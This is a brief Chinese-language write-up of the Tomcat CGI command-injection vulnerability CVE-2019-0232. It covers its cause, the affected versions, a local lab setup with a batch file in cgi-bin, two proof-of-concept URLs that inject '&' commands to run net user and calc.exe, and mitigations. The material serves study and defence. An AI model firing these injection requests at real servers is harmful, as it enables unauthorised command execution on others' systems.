# Tomcat 远程代码执行（CVE-2019-0232）

## 介绍
该漏洞是由于Tomcat CGI将命令行参数传递给Windows程序的方式存在错误，使得CGI Servlet被攻击者设计好的命令注入请求影响。成因是因为当将参数从JRE传递到Windows环境时，由于CGI_Servlet中的输入验证错误而存在该漏洞

条件是在Windows平台，要求启用了CGIServlet和enableCmdLineArguments参数。（两者默认是不启用的）

## 影响范围
Apache Tomcat 9.0.0.M1 to 9.0.17        

Apache Tomcat 8.5.0 to 8.5.39        

Apache Tomcat 7.0.0 to 7.0.93

## 方式
找到apache-tomcat-8.5.39\webapps\ROOT\WEB-INF目录

新建一个cgi-bin文件夹，创建一个hello.bat的文件

开始利用： \
1、查看用户

http://localhost:8080/cgi-bin/hello.bat?& C:\Windows\System32\net.exe user
（url编码一下）

2、打开计算器

http://localhost:8080/cgi-bin/hello.bat?& C:\Windows\System32\calc.exe
（url编码一下）

## 防御
检测字符串输入的合法性

CGIServlet和enableCmdLineArguments参数设置为false（默认就是false）